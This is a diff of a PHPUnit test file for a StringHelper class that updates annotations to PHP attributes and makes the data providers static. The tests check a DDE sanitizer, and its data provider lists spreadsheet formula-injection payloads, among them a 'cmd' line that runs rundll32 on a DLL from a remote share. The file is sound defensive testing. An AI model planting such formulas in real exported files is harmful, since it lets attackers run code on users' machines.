@@ -10,11 +10,11 @@
 namespace App\Tests\Utils;
 
 use App\Utils\StringHelper;
+use PHPUnit\Framework\Attributes\CoversClass;
+use PHPUnit\Framework\Attributes\DataProvider;
 use PHPUnit\Framework\TestCase;
 
-/**
- * @covers \App\Utils\StringHelper
- */
+#[CoversClass(StringHelper::class)]
 class StringHelperTest extends TestCase
 {
     public function testEnsureMaxLength(): void
@@ -29,7 +29,7 @@ class StringHelperTest extends TestCase
         self::assertEquals(10, mb_strlen(StringHelper::ensureMaxLength('까깨꺄꺠꺼께껴꼐꼬꽈꼬꽈', 10)));
     }
 
-    public function getDdeAttackStrings()
+    public static function getDdeAttackStrings()
     {
         yield ['DDE ("cmd";"/C calc";"!A0")A0'];
         yield [' DDE ("cmd";"/C calc";"!A0")A0'];
@@ -48,23 +48,19 @@ class StringHelperTest extends TestCase
         yield [PHP_EOL . "=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1"];
     }
 
-    /**
-     * @dataProvider getDdeAttackStrings
-     */
+    #[DataProvider('getDdeAttackStrings')]
     public function testSanitizeDde(string $input): void
     {
         self::assertEquals("' " . $input, StringHelper::sanitizeDDE($input));
     }
 
-    public function getNonDdeAttackStrings()
+    public static function getNonDdeAttackStrings()
     {
         yield [''];
         yield [' '];
     }
 
-    /**
-     * @dataProvider getNonDdeAttackStrings
-     */
+    #[DataProvider('getNonDdeAttackStrings')]
     public function testSanitizeDdeWithCorrectStrings(string $input): void
     {
         self::assertEquals($input, StringHelper::sanitizeDDE($input));
